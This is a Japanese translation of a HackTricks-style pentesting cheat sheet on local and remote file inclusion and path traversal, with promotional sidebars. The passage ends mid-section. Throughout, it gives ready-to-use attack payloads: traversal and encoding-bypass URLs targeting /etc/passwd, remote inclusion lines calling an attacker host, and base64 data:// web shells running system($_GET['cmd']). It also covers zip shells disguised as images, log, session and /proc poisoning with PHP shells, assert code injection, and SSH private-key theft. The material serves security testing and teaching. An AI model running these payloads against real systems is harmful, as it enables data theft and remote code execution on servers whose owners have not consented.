# ファイルインクルージョン/パス遍歴

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong>を使って、ゼロからヒーローまでAWSハッキングを学びましょう！</summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)で**フォロー**する
- **ハッキングトリックを共有するためにPRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリに貢献する

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取るために[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)サーバーに参加しましょう！

**ハッキングの洞察**\
ハッキングのスリルと挑戦に深く入り込むコンテンツに参加する

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、ハッキングの世界の速いペースについていく

**最新の発表**\
最新のバグバウンティの開始や重要なプラットフォームのアップデートに関する情報を入手する

[**Discord**](https://discord.com/invite/N3FrSbmwdy)に参加して、今日からトップハッカーと協力しましょう！

## ファイルインクルージョン

**リモートファイルインクルージョン（RFI）:** ファイルがリモートサーバーから読み込まれます（最高：コードを書いてサーバーが実行します）。PHPでは、これはデフォルトで**無効**になっています（**allow\_url\_include**）。\
**ローカルファイルインクルージョン（LFI）:** サーバーがローカルファイルを読み込みます。

この脆弱性は、ユーザーがサーバーが読み込むファイルをある方法で制御できる場合に発生します。

脆弱な**PHP関数**: require、require\_once、include、include\_once

この脆弱性を悪用するための興味深いツール: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCEファイル
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**複数の \*nix LFI リストを混合し、さらにパスを追加して、次のリストを作成しました:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

`/` を `\` に変更してみてください\
`../../../../../` を追加してみてください

脆弱性の存在を確認するためにファイル /etc/password を見つけるために複数の技術を使用するリストは[こちら](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)で見つけることができます。

### **Windows**

異なるワードリストの統合:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

`/` を `\` に変更してみてください\
`C:/` を削除して `../../../../../` を追加してみてください

脆弱性の存在を確認するためにファイル /boot.ini を見つけるために複数の技術を使用するリストは[こちら](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)で見つけることができます。

### **OS X**

Linux の LFI リストをチェックしてください。

## 基本的な LFI とバイパス

すべての例はローカルファイルインクルージョン用ですが、リモートファイルインクルージョンにも適用できます（page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/）。
```
http://example.com/index.php?page=../../../etc/passwd
```
### 非再帰的に取り除かれたトラバーサルシーケンス
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **ヌルバイト (%00)**

提供された文字列の末尾にさらに文字を追加してバイパスする（バイパス方法: $\_GET\['param']."php"）
```
http://example.com/index.php?page=../../../etc/passwd%00
```
これは**PHP 5.4以降で解決済み**

### **エンコーディング**

ダブルURLエンコードなどの非標準のエンコーディングを使用できます：
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### 既存のフォルダから

バックエンドがフォルダのパスをチェックしている可能性があります：
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### サーバー上のファイルシステムディレクトリの探索

サーバーのファイルシステムは、特定のテクニックを用いて、ファイルだけでなくディレクトリを再帰的に探索することができます。このプロセスには、ディレクトリの深さを特定し、特定のフォルダの存在を調査することが含まれます。以下に、これを達成するための詳細な方法が示されています：

1. **ディレクトリの深さを特定する:** 現在のディレクトリの深さを確認するために、`/etc/passwd` ファイルを正常に取得することによって（サーバーがLinuxベースの場合に適用されます）、ディレクトリの深さを確定します。深さが3であることを示す、次のような構造の例のURLがあります：
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **フォルダの調査:** 疑わしいフォルダの名前（例：`private`）をURLに追加し、次に`/etc/passwd`に移動します。追加のディレクトリレベルでは、深さを1つ増やす必要があります：
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **結果の解釈:** サーバーの応答によって、フォルダが存在するかどうかが示されます:
* **エラー / 出力なし:** 指定された場所におそらく`private`フォルダは存在しません。
* **`/etc/passwd`の内容:** `private`フォルダの存在が確認されました。
4. **再帰的な探索:** 発見されたフォルダは、同じ技術または従来のローカルファイルインクルージョン（LFI）メソッドを使用して、さらにサブディレクトリやファイルを調査できます。

ファイルシステム内の異なる場所のディレクトリを探索するには、ペイロードを適切に調整します。たとえば、`/var/www/`に`private`ディレクトリが含まれているかどうかを確認するには（現在のディレクトリが深さ3にあると仮定）、次のように使用します:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **パス切り詰め技術**

パス切り詰めは、Webアプリケーション内のファイルパスを操作するために使用される手法です。これは、特定のセキュリティ対策がファイルパスの末尾に追加の文字を付加することで、制限されたファイルにアクセスするためにしばしば使用されます。目標は、セキュリティ対策によって変更された後も、依然として目的のファイルを指すファイルパスを作成することです。

PHPでは、ファイルシステムの性質により、ファイルパスのさまざまな表現が同等と見なされることがあります。たとえば：

* `/etc/passwd`、`/etc//passwd`、`/etc/./passwd`、`/etc/passwd/` はすべて同じパスとして扱われます。
* 最後の6文字が `passwd` の場合、`/` を追加して `passwd/` とすると、対象のファイルが変更されません。
* 同様に、ファイルパスに `.php` が追加されている場合（例： `shellcode.php`）、末尾に `/.` を追加してもアクセスされるファイルは変更されません。

提供された例は、パス切り詰めを利用して `/etc/passwd` にアクセスする方法を示しています。これは、その中に含まれる機密情報（ユーザーアカウント情報）のために一般的なターゲットです。
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
これらのシナリオでは、必要なトラバーサルの数は約2027回程度になる可能性がありますが、この数はサーバーの構成によって異なる可能性があります。

* **ドットセグメントと追加文字の使用**: トラバーサルシーケンス (`../`) は、追加のドットセグメントと文字と組み合わせてファイルシステムをナビゲートするために使用でき、サーバーによって追加された文字列を無視する効果があります。
* **必要なトラバーサルの数を決定する**: 試行錯誤を通じて、`../` シーケンスの正確な数を見つけることができ、ルートディレクトリに移動し、その後 `/etc/passwd` に移動するために必要な数を見つけることができます。これにより、追加された文字列（例: `.php`）は中立化されますが、望ましいパス (`/etc/passwd`) はそのまま維持されます。
* **偽のディレクトリから始める**: 存在しないディレクトリ（例: `a/`）でパスを開始するのは一般的な方法です。このテクニックは予防措置として使用されるか、サーバーのパス解析ロジックの要件を満たすために使用されます。

パス切り詰め技術を使用する際には、サーバーのパス解析動作とファイルシステム構造を理解することが重要です。各シナリオには異なるアプローチが必要となる場合があり、最も効果的な方法を見つけるためにはテストがしばしば必要です。

**この脆弱性はPHP 5.3で修正されました。**

### **フィルター回避トリック**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## リモートファイルインクルージョン

PHPでは、これはデフォルトで無効になっています。なぜなら**`allow_url_include`**が**Off**になっているからです。これを動作させるには、**On**にする必要があり、その場合、サーバーからPHPファイルをインクルードしてRCEを取得できます。
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
もし何らかの理由で**`allow_url_include`**が**On**になっているが、PHPが外部ウェブページへのアクセスを**フィルタリング**している場合、[この投稿](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)によると、例えばデータプロトコルを使用してbase64でエンコードされたb64 PHPコードをデコードしてRCEを取得することができます:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
前のコードでは、最後の `+.txt` が追加された理由は、攻撃者が `.txt` で終わる文字列が必要だったためです。そのため、文字列はそれで終わり、b64デコード後にその部分は単なるゴミを返し、実際のPHPコードが含まれ（したがって、実行されます）。
{% endhint %}

`php://` プロトコルを使用しない別の例は次のとおりです：

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Pythonのルート要素

Pythonでは、次のようなコードがある場合：
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
ユーザーが`file_name`に**絶対パス**を渡すと、**前のパスが単に削除**されます。
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
以下は、[ドキュメント](https://docs.python.org/3.10/library/os.path.html#os.path.join) による意図された動作です：

> コンポーネントが絶対パスの場合、すべての前のコンポーネントが破棄され、絶対パスのコンポーネントから結合が続行されます。

## Java ディレクトリのリスト

Java でパストラバーサルがある場合、**ファイルではなくディレクトリを要求**すると、**ディレクトリのリストが返される**ようです。これは他の言語では起こらないでしょう (afaik)。

## トップ25のパラメータ

以下は、ローカルファイルインクルージョン (LFI) 脆弱性に対して脆弱である可能性のあるトップ25のパラメータのリストです ([リンク](https://twitter.com/trbughunters/status/1279768631845494787))：
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## PHPラッパーとプロトコルを使用したLFI / RFI

### php://filter

PHPフィルターを使用すると、データを読み取る前または書き込む前に基本的な**変更操作**を実行できます。フィルターには5つのカテゴリがあります:

* [文字列フィルター](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: データからタグを削除します（"<"と">"の間のすべて）
* このフィルターは、現代のPHPのバージョンから消えています
* [変換フィルター](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : 異なるエンコーディングに変換します（`convert.iconv.<input_enc>.<output_enc>`）。サポートされている**すべてのエンコーディングのリスト**を取得するには、コンソールで実行します: `iconv -l`

{% hint style="warning" %}
`convert.iconv.*`変換フィルターを悪用すると、**任意のテキストを生成**することができ、任意のテキストを書き込んだり、関数を作成したりするのに役立ちます。詳細については、[**phpフィルターを介したLFI2RCE**](lfi2rce-via-php-filters.md)を確認してください。
{% endhint %}

* [圧縮フィルター](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: コンテンツを圧縮します（多くの情報を外部に持ち出す場合に便利）
* `zlib.inflate`: データを解凍します
* [暗号化フィルター](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : 廃止予定
* `mdecrypt.*` : 廃止予定
* その他のフィルター
* phpで実行すると、いくつかの**予期しないフィルター**を見つけることができます: `var_dump(stream_get_filters());`
* `consumed`
* `dechunk`: HTTPチャンクエンコーディングを逆にします
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
"php://filter"の部分は大文字と小文字を区別しません
{% endhint %}

### phpフィルターをオラクルとして使用して任意のファイルを読み取る方法

[**この投稿**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle)では、サーバーから返された出力を取得せずにローカルファイルを読み取る技術が提案されています。この技術は、**phpフィルターをオラクルとして使用してファイルを1文字ずつ読み取る**ことに基づいています。これは、phpフィルターを使用してテキストを十分に大きくすることで、phpが例外をスローするようにすることができるためです。

元の投稿では、技術の詳細な説明が見つかりますが、ここでは簡単な要約を示します：

- テキストの先頭に先行する文字を残し、文字列のサイズを指数関数的に増やすためにコーデック**`UCS-4LE`**を使用します。
- これにより、**初期文字が正しく推測されたときに非常に大きなテキスト**が生成され、phpが**エラーをトリガー**します。
- **dechunk**フィルターは、最初の文字が16進数でない場合は**すべてを削除**するため、最初の文字が16進数かどうかを知ることができます。
- これは、最初の文字が16進数であるかどうかを確認するために、十分な変換を行って16進数文字ではなくなるようにすることで、テキストの先頭の文字を推測することができます。16進数であれば、dechunkはそれを削除せず、初期爆弾がphpエラーを引き起こします。
- コーデック**convert.iconv.UNICODE.CP930**は、各文字を次の文字に変換します（したがって、このコーデックを適用すると、a -> bになります）。これにより、たとえば最初の文字が`a`であるかどうかを発見できます。なぜなら、このコーデックを6回適用すると、a->b->c->d->e->f->gとなり、その文字はもはや16進数文字ではなくなるため、dechunkがそれを削除せず、phpエラーがトリガーされます。
- 初めに**rot13**などの他の変換を使用すると、n、o、p、q、rなどの他の文字を漏洩させることができます（他のコーデックを使用して他の文字を16進数範囲に移動させることもできます）。
- 最初の文字が数字の場合、それをbase64エンコードして、数字を漏洩させるために最初の2文字を漏洩する必要があります。
- **初期文字以上のデータを漏洩する方法**は、**convert.iconv.UTF16.UTF-16BE、convert.iconv.UCS-4.UCS-4LE、convert.iconv.UCS-4.UCS-4LE**などの順序メモリフィルターを使用して、文字の順序を変更し、テキストの最初の位置に他の文字を配置することができます。
- さらに**データを取得するため**には、**convert.iconv.UTF16.UTF16**で**先頭に2バイトのジャンクデータを生成**し、**UCS-4LE**を適用して**次の2バイトとピボット**させ、ジャンクデータまでデータを削除します（これにより、初期テキストの最初の2バイトが削除されます）。これを望ましいビットまで漏洩するまで続けます。

投稿では、これを自動的に実行するためのツールも漏洩しています：[php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit)。

### php://fd

このラッパーを使用すると、プロセスが開いているファイルディスクリプタにアクセスできます。開いているファイルの内容を漏洩するのに役立つ可能性があります：
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
あなたは**php://stdin、php://stdout、およびphp://stderr**を使用して、それぞれ**ファイルディスクリプタ0、1、および2**にアクセスすることもできます（攻撃にどのように役立つかはわかりません）

### zip:// および rar://

PHPShellが含まれたZipまたはRarファイルをアップロードしてアクセスします。\
rarプロトコルを悪用するためには、それを**特に有効化する必要があります**。
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

data://スキームは、データをURLとして扱うためのものです。これは、ファイルの内容を直接URLに埋め込むことができるため、ファイルインクルージョン攻撃に悪用される可能性があります。
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
注意：このプロトコルはphpの設定によって制限されています **`allow_url_open`** と **`allow_url_include`**

### expect://

Expectがアクティブ化されている必要があります。これを使用してコードを実行できます：
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POSTパラメーターにペイロードを指定します。
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

`.phar`ファイルは、Webアプリケーションがファイルの読み込みに`include`などの関数を利用する場合に、PHPコードを実行するために利用できます。以下に示すPHPコードスニペットは、`.phar`ファイルの作成を示しています:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar`ファイルをコンパイルするには、次のコマンドを実行する必要があります：
```bash
php --define phar.readonly=0 create_path.php
```
実行すると、`test.phar` というファイルが作成され、ローカルファイルインクルージョン（LFI）脆弱性を悪用する可能性があります。

LFIがPHPコードの実行なしにファイルの読み取りのみを行う場合、`file_get_contents()`、`fopen()`、`file()`、`file_exists()`、`md5_file()`、`filemtime()`、`filesize()`などの関数を介して、逆シリアル化脆弱性の悪用が試みられる可能性があります。この脆弱性は、`phar` プロトコルを使用してファイルを読み取ることに関連しています。

`.phar` ファイルのコンテキストで逆シリアル化脆弱性を悪用する詳細については、以下のドキュメントを参照してください：

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

**phpフィルタをサポートするPHPからの任意のファイル読み取りを悪用してRCEを取得することが可能でした**。詳細な説明は[**この投稿で見つけることができます**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**。**\
非常に簡単な要約：PHPヒープ内の**3バイトのオーバーフロー**が悪用され、特定のサイズの**フリーチャンクのチェーンを変更**して、**任意のアドレスに何かを書き込む**ことができるようになり、**`system`**を呼び出すフックが追加されました。\
より多くのphpフィルタを悪用して特定のサイズのチャンクを割り当てることが可能でした。

### その他のプロトコル

ここに[**含める可能性のあるプロトコルをさらにチェック**](https://www.php.net/manual/en/wrappers.php)**してください：**

* [php://memory および php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — メモリ内または一時ファイルに書き込む（ファイルインクルージョン攻撃でどのように有用かは不明）
* [file://](https://www.php.net/manual/en/wrappers.file.php) — ローカルファイルシステムへのアクセス
* [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URLへのアクセス
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URLへのアクセス
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — 圧縮ストリーム
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — パターンに一致するパス名を検索（印刷可能なものを返さないため、ここではあまり有用ではありません）
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — セキュアシェル2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — オーディオストリーム（任意のファイルを読み取るのには役立ちません）

## PHPの 'assert' を介したLFI

PHPにおけるローカルファイルインクルージョン（LFI）リスクは、文字列内のコードを実行できる 'assert' 関数を扱う際に特に高いです。これは、".. "のようなディレクトリトラバーサル文字を含む入力がチェックされているが適切にサニタイズされていない場合に特に問題となります。

たとえば、PHPコードがディレクトリトラバーサルを防ぐように設計されている場合、次のようになります：
```bash
assert("strpos('$file', '..') === false") or die("");
```
以下はトラバーサルを防ぐことを目的としていますが、結果的にコードインジェクションのためのベクトルを作成してしまいます。ファイル内容を読むためにこれを悪用するには、攻撃者は次のようにすることができます：
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
同様に、任意のシステムコマンドを実行するためには、次のように使用することができます:
```plaintext
' and die(system("id")) or '
```
重要なのは、これらのペイロードを**URLエンコードする**ことです。

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) サーバーに参加して、経験豊富なハッカーやバグバウンティハンターとコミュニケーションを取りましょう！

**ハッキングの洞察**\
ハッキングのスリルとチャレンジに深く入り込むコンテンツに参加しましょう

**リアルタイムハックニュース**\
リアルタイムのニュースと洞察を通じて、ハッキングの世界を追いかけましょう

**最新のお知らせ**\
最新のバグバウンティの開始や重要なプラットフォームのアップデートについて情報を得ましょう

**[Discord](https://discord.com/invite/N3FrSbmwdy)** に参加して、今日からトップハッカーと協力を始めましょう！

## PHP Blind Path Traversal

{% hint style="warning" %}
このテクニックは、**PHP関数**の**ファイルパス**を**制御**できる場合に関連します。ファイルにアクセスしますが、ファイルの内容は表示されません（単純な **`file()`** の呼び出しのようなもの）。
{% endhint %}

[**この素晴らしい投稿**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) では、PHPフィルタを介して盲目的なパストラバーサルを悪用して、**エラーオラクルを介してファイルの内容を外部に流出**させる方法が説明されています。

要約すると、このテクニックは、ファイルの内容を非常に**大きく**するために **"UCS-4LE" エンコーディング** を使用し、ファイルを開く **PHP関数** が **エラー** を引き起こすようにします。

その後、最初の文字を漏洩させるために、フィルタ **`dechunk`** が使用され、他のフィルタ（**base64** や **rot13** など）と最終的にフィルタ **convert.iconv.UCS-4.UCS-4LE** および **convert.iconv.UTF16.UTF-16BE** が使用され、他の文字を**先頭に配置して漏洩**されます。

**脆弱性のある可能性のある関数**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (これだけを読み取るターゲット)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

技術的な詳細については、言及された投稿をチェックしてください！

## LFI2RCE

### リモートファイルインクルージョン

以前に説明した内容は、[**このリンク**](./#remote-file-inclusion) を参照してください。

### Apache/Nginxログファイル経由

ApacheまたはNginxサーバーが**LFIに脆弱**である場合、インクルード関数内で **`/var/log/apache2/access.log` や `/var/log/nginx/access.log`** にアクセスを試みることができます。**ユーザーエージェント**内または**GETパラメータ**内に **`<?php system($_GET['c']); ?>`** のようなPHPシェルを設定し、そのファイルをインクルードします

{% hint style="warning" %}
シェルに**単一引用符**ではなく**二重引用符**を使用すると、二重引用符が文字列 "_**quote;**_" に変更され、**PHPはそこでエラーをスロー**し、**それ以外は実行されません**。

また、ペイロードを正しく**記述**していることを確認してください。そうしないと、ログファイルをロードしようとするたびにPHPがエラーをスローし、2回目の機会が得られなくなります。
{% endhint %}

これは他のログでも行うことができますが、ログ内のコードはURLエンコードされている可能性があり、これによりシェルが破壊される可能性があります。ヘッダー **authorisation "basic"** には Base64 で "user:password" が含まれ、ログ内でデコードされます。PHPShell をこのヘッダー内に挿入することができます。\
他の可能なログパス:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
### ファジングワードリスト: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### メール経由

**内部アカウント**（user@localhost）にPHPペイロードを含むメールを送信し、パスを使用してユーザーのメールに含めてみてください **`/var/mail/<USERNAME>`** または **`/var/spool/mail/<USERNAME>`**

### /proc/\*/fd/\* 経由

1. 多数のシェルをアップロードします（例：100）
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) を含めます。ここで、$PID = プロセスのPID（ブルートフォース可能）であり、$FD はファイルディスクリプタ（これもブルートフォース可能）です

### /proc/self/environ 経由

ログファイルのように、User-Agent にペイロードを送信すると、/proc/self/environ ファイル内に反映されます
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### アップロード経由

ファイルをアップロードできる場合は、その中にシェルペイロードをインジェクトしてください（例：`<?php system($_GET['c']); ?>`）。
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
### Zipファイルをアップロードする

PHPシェルを含むZIPファイルをアップロードしてアクセスします：
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHPセッション経由

ウェブサイトがPHPセッション（PHPSESSID）を使用しているかどうかを確認します。
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHPでは、これらのセッションは`/var/lib/php5/sess\[PHPSESSID]`ファイルに保存されます。
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
クッキーを`<?php system('cat /etc/passwd');?>`に設定します。
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFIを使用してPHPセッションファイルをインクルードします。
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### SSHを介して

sshがアクティブである場合は、使用されているユーザーを確認します（/proc/self/statusおよび/etc/passwd）し、**\<HOME>/.ssh/id\_rsa**にアクセスを試みます。

### vsftpdのログを介して

FTPサーバーvsftpdのログは _**/var/log/vsftpd.log**_ にあります。ローカルファイルインクルージョン（LFI）脆弱性が存在し、公開されたvsftpdサーバーへのアクセスが可能な場合、次の手順が考慮されます：

1. ログインプロセス中にユーザー名フィールドにPHPペイロードをインジェクトします。
2. インジェクション後、LFIを使用して _**/var/log/vsftpd.log**_ からサーバーログを取得します。

### PHPベース64フィルターを介して（base64を使用）

[この](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) 記事に示されているように、PHPベース64フィルターは非ベース64を無視します。これを使用してファイル拡張子のチェックをバイパスできます：base64で ".php" で終わるものを提供すると、"."を無視して "php" をbase64に追加します。以下は例です：
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### phpフィルターを介して（ファイル不要）

この[**解説**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)では、**phpフィルターを使用して**任意のコンテンツを出力できることが説明されています。つまり、**ファイルに書き込む必要なしに**、インクルード用に**任意のphpコードを生成**できます。

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### セグメンテーションフォールトを介して

`/tmp`に**一時的に保存されるファイル**を**アップロード**し、**同じリクエスト**で**セグメンテーションフォールト**をトリガーし、その後**一時ファイルが削除されなくなり**、それを検索できます。

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginxの一時ファイルストレージを介して

**ローカルファイルインクルージョン**を見つけ、**Nginx**がPHPの前で実行されている場合、次のテクニックでRCEを取得できるかもしれません：

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
